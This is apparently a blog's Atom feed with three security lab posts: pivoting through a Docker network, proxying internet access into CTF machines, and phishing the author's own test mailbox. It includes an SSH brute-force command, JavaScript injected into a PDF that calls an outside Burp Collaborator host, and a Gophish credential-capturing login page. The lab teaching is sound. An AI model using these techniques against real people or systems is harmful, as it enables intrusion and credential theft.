<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-07-07T00:16:32+05:45</updated><id>http://localhost:4000/feed.xml</id><title type="html">Sau Theme</title><subtitle>Nothing included right now. I will think about it.ss</subtitle><entry><title type="html">Docker: Pivoting Lab</title><link href="http://localhost:4000/blog/pivoting" rel="alternate" type="text/html" title="Docker: Pivoting Lab" /><published>2022-07-03T00:00:00+05:45</published><updated>2022-07-03T00:00:00+05:45</updated><id>http://localhost:4000/blog/pivoting</id><content type="html" xml:base="http://localhost:4000/blog/pivoting"><![CDATA[<h2 id="pivoting">Pivoting…</h2>

<!-- excerpt-start -->
<p>You may be familiar with the concept of pivoting. Pivoting is the way to move from one comporised system<!-- excerpt-end --> to another system.
<br /></p>

<p>Suppose,
<br />
“A”  has access “B”.<br />
“B” has access “C”.<br />
“A” does not have access “C”.<br /></p>

<p>So how can we access “C” directly from “A”? Well, that’s direcly not possbile so we use the concept of pivoting. “A” can use “B” as the foothold to get access to “C”.
“A” first compromise the system “B” then can use this machine as the lauch point to attack the “C”.</p>

<h2 id="lab-creation-overview">Lab Creation Overview</h2>

<p>To have some practises on pivoting I created a lab in docker.</p>

<p>Figure below gives the overview of the network setup of the docker compose files.
Victim1 and Victim2 are our targets.They are on subnet <em>172.16.101.0/24</em>. Attacker is on different subnet <em>172.16.100.0/24</em>.</p>

<p>Our helper machine  ( gateway machine ) will sit on both subnetworks.</p>

<p><img src="/assets/img/blog4-pivoting/1-overview.png" alt=" pivoting image &gt;&lt;" /></p>

<p> </p>

<h3 id="brief-overview-of-docker-compose-files">Brief Overview of Docker Compose Files</h3>

<p>You can get the docker compose files from my github repo.</p>

<p>Github Link: <a href="https://github.com/Cimihan123/Pivoting">Repository</a></p>

<p>For this lab two networks  are created:-</p>

<ol>
  <li>
    <p><strong>attacker</strong> -&gt; having subnet <em>172.16.100.0/24</em></p>
  </li>
  <li>
    <p><strong>victim</strong> -&gt; having subnet <em>172.16.101.0/24</em></p>
  </li>
</ol>

<p>By default docker use bridge driver. We are sticking with it although we can specify different network drivers.</p>

<p><img src="/assets/img/blog4-pivoting/2-subnet.png" alt=" subnet image &gt;&lt;" /></p>
<p align="center">Fig: docker-compose-subnet.yml</p>

<p> </p>

<p>Notice <em>helper</em> container is built locally. This will make easy as the base image will be customized rather than pulling everytime.</p>

<p>This container is part of the both networks: <em>attacker</em> and <em>victim</em>.</p>

<p><img src="/assets/img/blog4-pivoting/3-helper.png" alt=" helper image &gt;&lt;" /></p>
<p align="center">Fig: docker-compose.yml</p>

<p>A baseimage is being pulled.I have enabled ssh root login I don’t recommend doing this in your production environment or anywhere without proper security guidelines.XD</p>

<p><img src="/assets/img/blog4-pivoting/4-helper-image.png" alt=" helper image &gt;&lt;" /></p>
<p align="center">Fig: helper.Dockerfile</p>

<p><em>attacker</em> is the part of <em>attacker</em> subnet having an ip of <em>172.16.100.10</em></p>

<p><img src="/assets/img/blog4-pivoting/5-attacker.png" alt=" attacker image &gt;&lt;" /></p>
<p align="center">Fig: docker-compose.yml</p>

<p><em>attacker</em> container also uses the <em>phusion/baseimage</em>. Additionally some other tools ( ping, nmap etc ) will be installed.</p>

<p><img src="/assets/img/blog4-pivoting/5-attacker-image.png" alt=" attacker image &gt;&lt;" /></p>
<p align="center">Fig: attacker.Dockerfile</p>

<p><em>victim</em> container is also built locally. It does have network ip <em>172.16.101.10</em>. This is the part of subnet <em>172.16.101.0/24</em>.</p>

<p><img src="/assets/img/blog4-pivoting/6-victim1.png" alt=" victim1 image &gt;&lt;" /></p>
<p align="center">Fig: docker-compose.yml</p>

<p>I have installed <em>sar2html</em> Github Link: <a href="https://github.com/cemtan/sar2html/">Repository</a>.</p>

<p>It is the plotting tool for system statistics. There is an issue in this tool. We will discuss about this on different section. For now just assume there is a vulnerability in this tool.</p>

<p><img src="/assets/img/blog4-pivoting/6-victim1-image.png" alt=" victim1 image &gt;&lt;" /></p>
<p align="center">Fig: victim1.Dockerfile</p>

<p>For <em>victim2</em> there is no need to manipluate the image locally. There is already a vulnerable wordpress in docker hub. We just pull it from there. Below image show the structure to configure the wordpress as we also need a database server. They are in same subnetwork so they can communicate with each other.</p>

<p><img src="/assets/img/blog4-pivoting/7-victim2.png" alt=" victim2 image &gt;&lt;" /></p>
<p align="center">Fig: docker-compose.yml</p>

<h3 id="running-and-checking">Running and Checking</h3>

<p>As far now we have brief overview of our lab enviroment. Now we run the docker compose files and check them.</p>

<p>We first build them. It may take some time for pulling, download and installing. Then we create and run the created containers.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker-compose <span class="nt">-f</span> docker-compose-subnet.yml <span class="nt">-f</span> docker-compose.yml build
docker-compose <span class="nt">-f</span> docker-compose-subnet.yml <span class="nt">-f</span> docker-compose.yml up

</code></pre></div></div>

<p> </p>

<p>There are total of 5 containers running.Once <em>Attacker</em>, <em>helper</em>, <em>victim1</em> and <em>victim2</em> are running  we check the connection between them.</p>

<p><img src="/assets/img/blog4-pivoting/8-dockercompose.png" alt=" dockercomposeup image &gt;&lt;" /></p>
<p align="center">Fig: docker compose build &amp; up</p>

<p><em>attacker</em> container can reach the <em>helper</em> network.You see the successful ping reply back from the <em>helper</em>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping helper
</code></pre></div></div>
<p><img src="/assets/img/blog4-pivoting/9-attacker-ping-helper.png" alt=" pinging from attacher to helper image &gt;&lt;" /></p>
<p align="center">Fig:Ping check from attacker </p>

<p><img src="/assets/img/blog4-pivoting/9-attacker-ping-helper.png" alt=" pinging from attacher to helper image &gt;&lt;" /></p>
<p align="center">Fig:Ping check from attacker </p>

<p>I guess you can figure it out from the below picture.</p>

<p><img src="/assets/img/blog4-pivoting/10-pingall.png" alt=" pinging from attacker to helper image &gt;&lt;" /></p>
<p align="center">Fig:Ping check </p>

<h2 id="attacking-and-pivoting">Attacking and Pivoting</h2>

<p>Let’s first prefer discovering the ports in <em>helper</em> host.So our target is first to get access into the <em>helper</em> host.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> 172.16.100.11
</code></pre></div></div>
<p><img src="/assets/img/blog4-pivoting/11-nmap-helper.png" alt=" helper nmap scan &gt;&lt;" /></p>
<p align="center">Fig:nmap scan (helper) </p>

<p>So there is port 22 (ssh) open.We have hydra installed in the attacker machine and there is a rockyou.txt.
Bruteforcing the ssh login.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> root <span class="nt">-P</span> /home/rock.txt ssh://172.16.100.11
</code></pre></div></div>
<p> </p>

<p><img src="/assets/img/blog4-pivoting/12-hydra.png" alt=" bruteforce ssh &gt;&lt;" /></p>
<p align="center">Fig:Brutefore with Hydra </p>

<p>We got the password for the user <strong>root</strong>.Let’s try using this cred.So, we are now into the helper machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh root@172.16.100.11
</code></pre></div></div>
<p> </p>

<p><img src="/assets/img/blog4-pivoting/13-sshlogin.png" alt="  ssh login &gt;&lt;" /></p>
<p align="center">Fig:ssh login </p>

<p>There might be new hosts so I am going to scan further to gather new hosts and ports.</p>

<p><em>ifconfig</em> shows that the <em>helper</em> machine is the part of two addresses family.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                                                1. 172.16.100.11
                                                2. 172.16.101.11
</code></pre></div></div>

<p><img src="/assets/img/blog4-pivoting/15-ifconfig.png" alt="  ifconfig &gt;&lt;" /></p>
<p align="center">Fig:ifconfig </p>

<p> </p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hostname -I -&gt; displays all the addresses for the host
</code></pre></div></div>

<p><img src="/assets/img/blog4-pivoting/16-hostname.png" alt="  hostname &gt;&lt;" /></p>
<p align="center">Fig:hostname </p>

<p> </p>

<p>Having ssh access makes very easy for tunneling.Creating dynamically port forwading leverages the SOCKS proxy.This will deliver all the trafic through ssh conncetion via given port to the destination server.Here we are forwading all the traffics to the attacker machine.</p>

<p><strong>-N = disable execution of command</strong></p>

<p><strong>-f = runs in background</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-D</span> 9050 root@172.16.100.11 <span class="nt">-f</span> <span class="nt">-N</span>
</code></pre></div></div>
<p><img src="/assets/img/blog4-pivoting/17-ssh-dynamic.png" alt="  dynamic &gt;&lt;" /></p>
<p align="center">Fig:dynamic port forwarding </p>

<p> </p>

<p>Cross checking if it is running in background or not.XD</p>

<p><img src="/assets/img/blog4-pivoting/17-1-netstat.png" alt="  netstat &gt;&lt;" /></p>
<p align="center">Fig:netstat </p>

<p>What we need now is a proxy tool.I am going to use <em>proxychains</em>.Remember the port we mentioned in “/etc/proxychains.conf” should be same as dynamic port.</p>

<p><img src="/assets/img/blog4-pivoting/18-proxychain.png" alt="  proxychain &gt;&lt;" /></p>
<p align="center">Fig:proxychain conf </p>

<h4 id="discovering-newer-hosts-victims">Discovering newer hosts (victims)</h4>

<p>The major concern is finding hosts.Having <em>nmap</em> would have been easier but mostly in real case scenerio you won’t find.</p>

<p><img src="/assets/img/blog4-pivoting/14-nonmap.png" alt="  no nmap &gt;&lt;" /></p>
<p align="center">Fig:no nmap </p>

<p>We can run the ping sweep technique to scan hosts. The below one liner code will run in parallel mode.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 254<span class="si">)</span><span class="p">;</span> <span class="k">do</span> <span class="o">(</span>ping <span class="nt">-c</span> 1 172.16.101.<span class="k">${</span><span class="nv">i</span><span class="k">}</span> | <span class="nb">grep</span> <span class="s2">"64 bytes from"</span> &amp;<span class="o">)</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span>
</code></pre></div></div>
<p><img src="/assets/img/blog4-pivoting/19-loop-ping.png" alt="  ping scan hosts &gt;&lt;" /></p>
<p align="center">Fig:Host scan using ping </p>]]></content><author><name></name></author><category term="pivot" /><summary type="html"><![CDATA[Pivoting… You may be familiar with the concept of pivoting. Pivoting is the way to move from one comporised system]]></summary></entry><entry><title type="html">Proxy: Accessing Network Connection</title><link href="http://localhost:4000/blog/proxy" rel="alternate" type="text/html" title="Proxy: Accessing Network Connection" /><published>2022-03-21T00:00:00+05:45</published><updated>2022-03-21T00:00:00+05:45</updated><id>http://localhost:4000/blog/proxy</id><content type="html" xml:base="http://localhost:4000/blog/proxy"><![CDATA[<p> </p>

<!-- excerpt-start -->
<p><span style="font-size:30px;">I</span>n this blog, I will explain how to access network connections on Tryhackme/HTB/etc…. machines.Having an internet connection will make it a lot easier when we are trying to pwn machines <!-- excerpt-end --> or playing attack/defense challenges although it could be slow but works.</p>

<h3 id="setup">Setup</h3>
<p>I am performing it on my machine which is free to play on TryHackMe
Link: <a href="https://tryhackme.com/room/enpass">EnPass</a></p>

<p>The machine is up.</p>

<p><img src="/assets/img/blog3-proxy/1.png" alt=" connected &gt;&lt;" /></p>

<p>We have to install a proxy server on our local machine. I will be going to use <em>Squid Proxy</em>.<br />
I am using arch on wsl2.
<img src="/assets/img/blog3-proxy/2.png" alt=" squid-install &gt;&lt;" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>For <span class="nb">arch</span>: <span class="nb">sudo </span>pacman <span class="nt">-Sy</span> squid
For ubuntu: <span class="nb">sudo </span>apt <span class="nb">install </span>squid <span class="nt">-y</span>
</code></pre></div></div>
<p>Then enable the squid service and start it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>systemctl <span class="nb">enable </span>squid
<span class="nb">sudo </span>systemctl start squid
or
<span class="nb">sudo </span>service squid start
</code></pre></div></div>
<p>Let’s check locally if it is working or not.</p>

<p><img src="/assets/img/blog3-proxy/3.png" alt=" squid-check &gt;&lt;" />
As you see the connection is made via squid proxy.
On normal, it would have been looked like this ( without Via: header)..
<img src="/assets/img/blog3-proxy/4.png" alt=" squid-check &gt;&lt;" /></p>

<p>So far we are good with the setup. Now let’s first gain root access to the remote machine.</p>

<h3 id="performing">Performing</h3>

<p>Right now I am on the remote machine as a root user.
<img src="/assets/img/blog3-proxy/5.png" alt=" root-access &gt;&lt;" /></p>

<p>The <strong>squid proxy</strong> runs on port 3128. We have to first forward our traffic to the remote machine via ssh.</p>

<p>Basically, it’s a <strong>remote port</strong> forwarding where all the traffic/connections are passed from the SSH server to <br />the remote server via an SSH client. <br />In a simple term, we are giving access to the people who can’t whereas in the <strong>local port forward</strong>, we access the resources that we cannot.</p>

<p><img src="/assets/img/blog3-proxy/6.png" alt=" port-forwarding &gt;&lt;" />
We have successfully port forwarded.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-R</span> 3128:&lt;your-ip&gt;:3128 <span class="nt">-i</span> id_rsa root@&lt;machine-ip&gt;
ss <span class="nt">-ltnp</span> | <span class="nb">grep </span>3128
</code></pre></div></div>
<p>Let’s confirm with the help of curl.</p>

<p><img src="/assets/img/blog3-proxy/7.png" alt=" proxy-check &gt;&lt;" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl  <span class="nt">-x</span> http://127.0.0.1:3128 http://www.google.com/ <span class="nt">-I</span>
</code></pre></div></div>
<p><em>We are good with it</em></p>

<p>We have successfully made the network connection work.</p>

<h3 id="extra">Extra</h3>

<p>What if we want to download packages? <em>apt cmdline</em> won’t download or update anything without an internet connection. 
Just a few steps and it will start working.</p>

<p>Add the following line into the <em>/etc/profile</em>. This will make the proxy environment enable for all users globally.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>export http_proxy=http://127.0.0.1:3128/
</code></pre></div></div>

<p><img src="/assets/img/blog3-proxy/8.png" alt=" proxy-check-without-x &gt;&lt;" /></p>

<p><img src="/assets/img/blog3-proxy/9.png" alt=" proxy-check-without-x &gt;&lt;" /></p>

<p>We don’t have to now mention the “-x” flag.<br /><em>apt</em> will also work now. you can see <em>Nmap</em>  is not installed first. Let’s try installing <strong>Nmap</strong>.</p>

<p><img src="/assets/img/blog3-proxy/10.png" alt=" proxy-check-without-x &gt;&lt;" /></p>

<p>Yea, we are now successfully getting an internet connection.</p>

<p>If you can’t install any packages ( <strong>apt</strong> ) then you can try adding following line into a file “<strong>/etc/apt/apt.conf</strong>”.<br />Create it if you can’t find it.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Acquire::http::Proxy <span class="s2">"http://127.0.0.1:3128/"</span><span class="p">;</span>
</code></pre></div></div>

<p> </p>

<p> </p>

<p>Thank you for reading. :)</p>

<p>Have a good day/night.</p>]]></content><author><name></name></author><category term="proxy" /><summary type="html"><![CDATA[  In this blog, I will explain how to access network connections on Tryhackme/HTB/etc…. machines.Having an internet connection will make it a lot easier when we are trying to pwn machines]]></summary></entry><entry><title type="html">Phishing: Creating and Analyzing</title><link href="http://localhost:4000/blog/phish" rel="alternate" type="text/html" title="Phishing: Creating and Analyzing" /><published>2022-01-16T00:00:00+05:45</published><updated>2022-01-16T00:00:00+05:45</updated><id>http://localhost:4000/blog/phish</id><content type="html" xml:base="http://localhost:4000/blog/phish"><![CDATA[<h3 id="phish-phish-phish">Phish.. Phish.. Phish..</h3>

<!-- excerpt-start -->
<p><span style="font-size:30px;">I</span>n this blog, I am going to phish myself. Jumping directly into a conclusion does not make sense so I will be explaining from “how-to-create” to “how-to-do”.
 <!-- excerpt-end -->
Just the outlines of what I am going to use to perform this task are given below:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Docker
2. Gophish
3. Mailhog
4. Sample pdf file
5. JS2PDFInjector
6. peepdf
7. pdfid
8. Remnux
</code></pre></div></div>

<p>The purpose of using docker is for both learning and easiness.</p>

<p>To spin up both services Gophish and Mailog I have defined them in a docker YAML file</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">services</span><span class="pi">:</span>
  <span class="na">gophish</span><span class="pi">:</span>
    <span class="na">image</span><span class="pi">:</span> <span class="s2">"</span><span class="s">gophish/gophish"</span>
    <span class="na">ports</span><span class="pi">:</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">3333:3333"</span>
  <span class="na">mailhog</span><span class="pi">:</span>
    <span class="na">image</span><span class="pi">:</span> <span class="s2">"</span><span class="s">mailhog/mailhog"</span>
    <span class="na">ports</span><span class="pi">:</span> 
      <span class="pi">-</span> <span class="s2">"</span><span class="s">1025:1025"</span>
      <span class="pi">-</span> <span class="s2">"</span><span class="s">8025:8025"</span> 
    <span class="na">depends_on</span><span class="pi">:</span>
        <span class="pi">-</span> <span class="s">gophish</span>

</code></pre></div></div>

<h1 id="creating"><strong>Creating</strong></h1>
<h1 id="overview"><strong><em>Overview</em></strong></h1>

<p>First I will inject malicious js code into a pdf file. Then I will phish myself with that attached malicious pdf file. I will also create a fake login page and capture the creds submitted by the victim.</p>

<p> </p>

<p><strong>Step 1: Creating a malicious pdf file</strong></p>

<p>I am using JS2PDFInjector to inject a simple malicious js code into a pdf file.</p>

<p>Link: <a href="https://github.com/cornerpirate/JS2PDFInjector">JS2PDFInjector</a></p>

<p><img src="/assets/img/blog2-phish/1.png" alt=" js2pdfinjector &gt;&lt;" /></p>

<p>This will pop an alert while opening the file on a pdf reader. Not all pdf readers would execute the code. Adobe Acrobat contains the APIs to read js code. For this blog, we will be using acrobat for POC.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">alter alert</span><span class="dl">"</span><span class="p">);</span>
<span class="k">this</span><span class="p">.</span><span class="nx">submitForm</span><span class="p">(</span><span class="dl">'</span><span class="s1">http://azdn342b12dbmo0uvmj5yrekrbx1lq.burpcollaborator.net</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>

<p><img src="/assets/img/blog2-phish/2.png" alt=" js2pdfinjector &gt;&lt;" />
<em>Injecting code into a sample.pdf file</em></p>

<p> </p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">java</span> <span class="o">-</span><span class="n">jar</span> <span class="nc">JS2PDFInjector</span><span class="o">-</span><span class="mf">1.0</span><span class="o">.</span><span class="na">jar</span> <span class="err">$</span><span class="o">(</span><span class="n">pwd</span><span class="o">)/</span><span class="n">sample</span><span class="o">.</span><span class="na">pdf</span> <span class="n">app</span><span class="o">.</span><span class="na">js</span>
</code></pre></div></div>

<p>Remember: you need to provide absolute paths for the pdf. Otherwise, you will encounter the error like shown in the image below.</p>

<p><img src="/assets/img/blog2-phish/3.png" alt=" js2pdfinjector2 &gt;&lt;" /></p>

<p> </p>

<p><strong>Step 2: Creating a phishing campaign</strong></p>

<p>Starting from the compose file where we have added two services Gophish and Mailhog.</p>

<blockquote>
  <p>“Gophish is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily set up and execute phishing engagements and security awareness training.</p>
</blockquote>

<blockquote>
  <p>“MailHog to create fake SMTP server for testing purpose.</p>
</blockquote>

<p>Spinning up the aforementioned docker file.</p>

<p><img src="/assets/img/blog2-phish/4.png" alt=" dockerup &gt;&lt;" />
The gophish server is exposed to port 3333. The default username is “admin” and the password is “gophish”. However, the default password won’t match as for the docker the password will be different and unique at each start of the service.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run -it --rm -p 3333:3333 gophish/gophish
</code></pre></div></div>

<p>If you are running without a composing tool then I would recommend running in foreground mode. The console will show standard outputs, inputs, and errors in foreground mode. Running with detach mode will conceal all these file handling processes logs.</p>

<p>Scroll and you’ll get the password.</p>

<p><img src="/assets/img/blog2-phish/5.png" alt=" gophish &gt;&lt;" /></p>

<p><img src="/assets/img/blog2-phish/6.png" alt=" gophish &gt;&lt;" /></p>

<p>Change the password.
<img src="/assets/img/blog2-phish/7.png" alt=" gophish &gt;&lt;" /></p>

<p>Now we are logged in.
<img src="/assets/img/blog2-phish/8.png" alt=" gophish &gt;&lt;" /></p>

<p>Why don’t we first test our SMTP server if it is working or not?</p>

<p>As for sending emails, we need an SMTP server. This protocol is widely used to send, receive or relay outgoing emails.</p>

<p><strong>Sending profile</strong> is where we configure our SMTP server. We are using mailhog for testing the SMTP server. It is free and very easy to use.</p>

<p><strong>Mailhog</strong> binds SMTP server to address 0.0.0.:1025.
<img src="/assets/img/blog2-phish/9.png" alt=" mailhog-ip &gt;&lt;" /></p>

<p>It also provides GUI where it stores outgoing emails and shows 
connections.</p>

<p><img src="/assets/img/blog2-phish/10.png" alt=" gophish &gt;&lt;" /></p>

<p> </p>

<h4 id="1-sending-profile"><strong>1. Sending Profile</strong></h4>

<p>Create a new <strong>sending profile</strong>. Put the name. “phish-test@mail.com” is the mail from which I am going to send mail. In the host, we are required to fill it with the SMTP server. I have provided the SMTP binding address exposed by mailhog which is <strong>0.0.0.0:8025</strong>.</p>

<p><img src="/assets/img/blog2-phish/11.png" alt=" sending-profile &gt;&lt;" /></p>

<p>I am sending mail to the test email “hello-testme@mail.com”.</p>

<p><img src="/assets/img/blog2-phish/12.png" alt=" sending-profile &gt;&lt;" /></p>

<p>Clicking on the “send” button.</p>

<p><img src="/assets/img/blog2-phish/13.png" alt=" gophish &gt;&lt;" /></p>

<p>As you see it is throwing an error. It fails to make the connection to the mailhog.</p>

<p>You won’t have to face this issue if you don’t use docker.</p>

<p>I am supposing that the reason for not making a connection is due to running on different containers. To make it successful we have to connect with the IP assigned with it, not with the binding address. Containers can communicate with each other in the same host if they are in a bridge network. It is the default network that gives accessibility to communicate with docker containers with each other.</p>

<p>Notice the network id created for the phishing services.</p>

<p><img src="/assets/img/blog2-phish/14.png" alt=" docker-network-list &gt;&lt;" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker network ls
docker network inspect fcff01c8be6a
</code></pre></div></div>

<p>Let’s find the network IP assigned to it. There is also a gateway for both containers. But to resolve earlier we have to get the IP assigned to container <strong>mailhog</strong>.</p>

<p><img src="/assets/img/blog2-phish/15.png" alt=" gophish &gt;&lt;" /></p>

<p>Scroll until we find the ip assigned to that container.</p>

<p><img src="/assets/img/blog2-phish/16.png" alt=" gophish &gt;&lt;" /></p>

<p>Now let’s try with the above IP.</p>

<p><img src="/assets/img/blog2-phish/17.png" alt=" gophish &gt;&lt;" /></p>

<p>The email is successfully sent.</p>

<p><img src="/assets/img/blog2-phish/18.png" alt=" gophish &gt;&lt;" /></p>

<p>We received it.</p>

<p><img src="/assets/img/blog2-phish/19.png" alt=" gophish &gt;&lt;" /></p>

<p>Now, save the profile.</p>

<p> </p>

<h4 id="2-landing-pages"><strong>2. Landing Pages</strong></h4>

<p>The landing page is the page that is displayed to the victim when he/she clicks the link created by attackers. The page can be anything that can lure victims easily. For example, lottery page, urgent password reset page, etc. If you trick someone then you can get anything from him/her. As an attacker, you should also be very creative while making landing pages. If the page does not look catchy there are fewer chances of victims falling for it.</p>

<p>Just look at the page below, who is going to fall for it? Nobody.</p>

<p>For this blog, I am continuing with it. It’s a simple login page.</p>

<p>I will record the username and password submitted by the target email user.</p>

<p>I will also attach the pdf file which we created earlier.</p>

<p><img src="/assets/img/blog2-phish/20.png" alt=" html-page &gt;&lt;" /></p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;</span>Right Now Nothing<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
        name: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"username"</span> <span class="nt">&gt;&lt;br&gt;</span>
        pass: <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"password"</span> <span class="nt">&gt;&lt;br&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"submit"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
    
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>HTML and PHP files that I am using.</p>

<p>We create a tunnel with the help of ngrok.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ngrok http 9002
</code></pre></div></div>
<p><img src="/assets/img/blog2-phish/21.png" alt=" ngrok &gt;&lt;" /></p>

<p>We also have to start our local server otherwise it will fail to create a tunnel connection.</p>

<p><img src="/assets/img/blog2-phish/22.png" alt=" landing-page &gt;&lt;" /></p>

<p><img src="/assets/img/blog2-phish/23.png" alt=" python-server &gt;&lt;" /></p>

<p>We import the site. Put the forwarding URL created by ngrok.</p>

<p>We could even copy the HTML content instead of importing it. Both have their own purpose.It will just import the static page created by us.</p>

<p><img src="/assets/img/blog2-phish/24.png" alt=" import-site &gt;&lt;" /></p>

<p>Notice the HTML page is rendered.</p>

<p><img src="/assets/img/blog2-phish/25.png" alt=" landing-page-import &gt;&lt;" /></p>

<p><img src="/assets/img/blog2-phish/26.png" alt=" landing-page-redirect &gt;&lt;" /></p>

<p>I have also added a redirection page.</p>

<p><img src="/assets/img/blog2-phish/27.png" alt=" congo &gt;&lt;" /></p>

<p>Save it. You can also modify and delete pages.</p>

<p><img src="/assets/img/blog2-phish/28.png" alt=" landing-page-save &gt;&lt;" /></p>

<h4 id="3-email-templates"><strong>3. Email Templates</strong></h4>

<p><strong>Email Templates</strong> are contents sent to the email targets. You may have noticed the email body in Gmail. Email templates represent that. It is the content of the body that you are going to send to the targeted user.</p>

<p>Poor sample of phishing mail content created by me. XD</p>

<p>You can create your own. If I were a phisher, I would fail miserably.</p>

<p>We are creating an HTML template. This way we could insert HTML tags, elements, etc.</p>

<p><img src="/assets/img/blog2-phish/29.png" alt=" template &gt;&lt;" /></p>

<p><strong>{{.URL}}</strong> this will automatically create the link. It will be our gophish server IP.</p>

<p><strong>{{.FirstName}}</strong> will display the first name of the targeted email user. You will see this in the users and groups section where we have to add users to whom we are going to launch the phishing campaign.</p>

<p><img src="/assets/img/blog2-phish/30.png" alt=" template &gt;&lt;" /></p>

<p>You may have also noticed the “Add Tracking Image”. The purpose of it is to ensure that gophish knows when the user opens the email.</p>

<p>We have created an email template successfully.</p>

<p><img src="/assets/img/blog2-phish/31.png" alt=" template &gt;&lt;" /></p>

<p>I forgot to add an attachment. Let’s edit this. Click on “Add Files” and select the pdf file.</p>

<p><img src="/assets/img/blog2-phish/32.png" alt=" template &gt;&lt;" /></p>

<p> </p>

<h4 id="4-users--groups"><strong>4. Users &amp; Groups</strong></h4>

<p>We add users and basically, we can say victims from a phisher’s perspective. There is also an option to import users in bulk.</p>

<p><img src="/assets/img/blog2-phish/33.png" alt=" template &gt;&lt;" /></p>

<p>We have added a sample user john wick. We can modify groups and delete them.</p>

<p><img src="/assets/img/blog2-phish/34.png" alt=" template &gt;&lt;" /></p>

<p>Save it.</p>

<p> </p>

<h4 id="5-campaigns"><strong>5. Campaigns</strong></h4>

<p>This is the most interesting section. From here we launch our attack, monitoring emails activities like opening of emails, clicking links, etc.</p>

<p>Creating a new campaign where we have an email template, landing page, and groups associated which we created earlier.</p>

<p>Remember the URL should be a gophish listener and should be accessible by targeted users. “172.18.0.2” is the IP from where my gophish server is running.
As I am running docker, it was like before. Just ensure that the URL should be a gophish listener.</p>

<p><img src="/assets/img/blog2-phish/35.png" alt=" template &gt;&lt;" /></p>

<p>Reflecting the IP into the body will make it very suspicious and it is not a good habit to put the IP address directly into the email body. I have added a hostname in my host’s file. This will resolve my gophish IP address into <strong>“testingserver.op”</strong>.</p>

<p>If you remember we put “{{.URL}}” in our email template. Actually, we are putting a gopher listener URL here.</p>

<p><img src="/assets/img/blog2-phish/35.png" alt=" template &gt;&lt;" /></p>

<p>Time to launch it.</p>

<p><img src="/assets/img/blog2-phish/35.png" alt=" template &gt;&lt;" /></p>

<p>The dashboard gives a clear view. The status indicates that the email is sent successfully.</p>

<p>Let’s move into our mailhog GUI. We have one email in our inbox.</p>

<p><img src="/assets/img/blog2-phish/36.png" alt=" template &gt;&lt;" /></p>

<p>We have received one email.</p>

<p><img src="/assets/img/blog2-phish/37.png" alt=" template &gt;&lt;" /></p>

<p><img src="/assets/img/blog2-phish/38.png" alt=" template &gt;&lt;" /></p>

<p>We can find our attached pdf in the MIME section.</p>

<p><img src="/assets/img/blog2-phish/39.png" alt=" template &gt;&lt;" /></p>

<p>Download the attached pdf file.</p>

<p>Notice the link and open it. Yeah, the landing page will be displayed.</p>

<p><img src="/assets/img/blog2-phish/40.png" alt=" template &gt;&lt;" /></p>

<p>Fill up the form and click on submit button.</p>

<p><img src="/assets/img/blog2-phish/41.png" alt=" template &gt;&lt;" /></p>

<p>We will get redirected to the page which is intended to.</p>

